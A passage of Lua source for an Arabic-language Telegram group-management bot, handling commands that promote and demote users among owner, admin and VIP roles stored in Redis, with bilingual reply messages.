if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..result.sender_user_id_..' ، ??\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه المدراء العامين »*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deownerall_by_reply)
end
end
----------------------------------------bot-------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل مدير عام @(.*)$") then
local hash = 'bot:onall:'
local ap = {string.match(text, "^(تنزيل مدير عام) @(.*)$")}
function remownerall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:srem(BOT..hash, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The Owner all ؛ '..result.id_..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله من « قائمه المدراء العامين »'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remownerall_by_username)
end
end
----------------------------------------------bot-------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل مدير عام (%d+)$") then
local hash = 'bot:onall:'
local ap = {string.match(text, "^(تنزيل مدير عام) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:srem(BOT..hash, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner all ؛ '..ap[2]..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه المدراء العامين »*', 1, 'md')
end
end
end
end 
------------------------------------------bot-----------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع ادمن عام$") then
function promoteall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:moall:'
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن عام » سابقا*', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been promote all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن عام » بنجاح*', 1, 'md')
end
botx1:sadd(BOT..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
end
end
-----------------------------------------bot------------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع ادمن عام @(.*)$") then
local ap = {string.match(text, "^(رفع ادمن عام) @(.*)$")}
function promoteall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « ادمن عام » بنجاح'
end
botx1:sadd(BOT..'bot:moall:', result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promoteall_by_username)
end
 end
-------------------------------------bot----------------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع ادمن عام (%d+)$") then
local ap = {string.match(text, "^(رفع ادمن عام) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن عام » بنجاح*', 1, 'md')
end
end
botx1:sadd(BOT..'bot:moall:', ap[2])
end
-----------------------------------------bot------------------------------------------------------
if text:match("^تنزيل ادمن عام$") then
function demoteall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:moall:'
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « ادمن عام » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from promoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه الادمن العام »*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
end
-------------------------------------------bot----------------------------------------------------
if text:match("^تنزيل ادمن عام @(.*)$") then
local hash = 'bot:moall:'
local ap = {string.match(text, "^([Dd]emoteall) @(.*)$")}
function demoteall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ الادمن العام « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله « عضو » بنجاح'
end
botx1:srem(BOT..hash, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demoteall_by_username)
end
------------------------------------------bot-----------------------------------------------------
if text:match("^تنزيل ادمن عام (%d+)$") then
local hash = 'bot:moall:'
local ap = {string.match(text, "^(تنزيل ادمن عام) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *الادمن العام* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله « عضو » بنجاح*', 1, 'md')
end
end
botx1:srem(BOT..hash, ap[2])
end
end
------------------------------------------bot-----------------------------------------------------
if is_moall(msg.sender_user_id_, msg.chat_id_) then
local text = msg.content_.text_:gsub('رفع مميز عام','Setvipall')
if text:match("^[Ss]etvipall$") and msg.reply_to_message_id_ ~= 0  then
function promoteall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:vpall:'
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مميز عام » سابقا*', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مميز عام » بنجاح*', 1, 'md')
end
botx1:sadd(BOT..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
end
----------------------------------------bot-------------------------------------------------------
if text:match("^[Ss]etvipall @(.*)$") then
local ap = {string.match(text, "^([Ss]etvipall) @(.*)$")}
function promoteall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « مميز عام » بنجاح'
end
botx1:sadd(BOT..'bot:vpall:', result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promoteall_by_username)
end
-------------------------------bot----------------------------------------------------------------
if text:match("^[Ss]etvipall (%d+)$") then
local ap = {string.match(text, "^([Ss]etvipall) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been a VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مميز عام » بنجاح*', 1, 'md')
end
end
botx1:sadd(BOT..'bot:vpall:', ap[2])
end
-------------------------------------bot----------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مميز عام','demdonky')
if text:match("^[Dd]emvipall$") and msg.reply_to_message_id_ ~= 0 then
function demoteall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:vpall:'
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « مميز عام » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المميز العام* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله « عضو اعتيادي » *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
end
-----------------------------------------bot------------------------------------------------------
if text:match("^[Dd]emvipall @(.*)$") then
local hash = 'bot:vpall:'
local ap = {string.match(text, "^([Dd]emvipall) @(.*)$")}
function demoteall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*📌|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ المميز العام « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله « عضو اعتيادي » '
end
botx1:srem(BOT..hash, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demoteall_by_username)
end
--------------------------------bot---------------------------------------------------------------
if text:match("^[Dd]emvipall (%d+)$") then
local hash = 'bot:vpall:'
local ap = {string.match(text, "^([Dd]emvipall) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*📌|| The vip all ؛ '..ap[2]..' ، 📌\n🎈|| was removed from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المميز العام* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله « عضو اعتيادي » بنجاح*', 1, 'md')
end
botx1:srem(BOT..hash, ap[2])
end
end
end
------------------------------------------bot-----------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * « هو مطي شرفع منه بعد 😔😹 » *', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 📌\n🎈|| has been a Full donky  😂💔\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مطي  🐴 » *', 1, 'md')
end
botx1:sadd(BOT..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------bot-------------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * « لم يتم رفعه مطي » *', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from donky list \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المطي* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * « يبقه مطي بس حنزله لخاطرك 😔😹 » *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------------bot-------------------------------------------------
if is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
local text = msg.content_.text_:gsub('رفع مدير','setowner')
if text:match("^[Ss]etowner$") then
function owner_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:owners:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مدير » سابقا *', 1, 'md')
end
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*📌|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مدير » بنجاح *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,owner_by_reply)
end
--------------------------------------------faedee---------------------------------------------------
if text:match("^[Ss]etowner @(.*)$") then
local ap = {string.match(text, "^([Ss]etowner) @(.*)$")}
function setowner_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:sadd(BOT..'bot:owners:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « مدير » '
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end  end  end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setowner_by_username)
end
--------------------------------------bot---------------------------------------------------------
if text:match("^[Ss]etowner (%d+)$") then
local ap = {string.match(text, "^([Ss]etowner) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:sadd(BOT..'bot:owners:'..msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been onwer ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مدير » بنجاح *', 1, 'md')
end end end
----------------------------------------bot-------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مدير','Demowner')
if text:match("^[Dd]emowner$") then
function deowner_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:owners:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a owner ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * لم يتم رفعه « مدير » سابقا *', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المدير* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم تنزيله « عضو » بنجاح *', 1, 'md')
end end end end          
getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
end
----------------------------------------bot-------------------------------------------------------
if text:match("^[Dd]emowner @(.*)$") then
local hash = 'bot:owners:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emowner) @(.*)$")}
function remowner_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:srem(BOT..hash, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The Owner ؛ '..result.id_..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ المدير « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله « عضو» '
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end end end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remowner_by_username)
end
----------------------------------------------bot-------------------------------------------------
if text:match("^[Dd]emowner (%d+)$") then
local hash = 'bot:owners:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emowner) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:srem(BOT..hash, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..ap[2]..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المدير* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم تنزيله « عضو » بنجاح *', 1, 'md')
end end end end
----------------------------------------------bot-------------------------------------------------
if is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع مطور رتبه ثالثه$") then
function addadmin_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:admins:'
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مطور ثالث » سابقا *', 1, 'md')
end
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
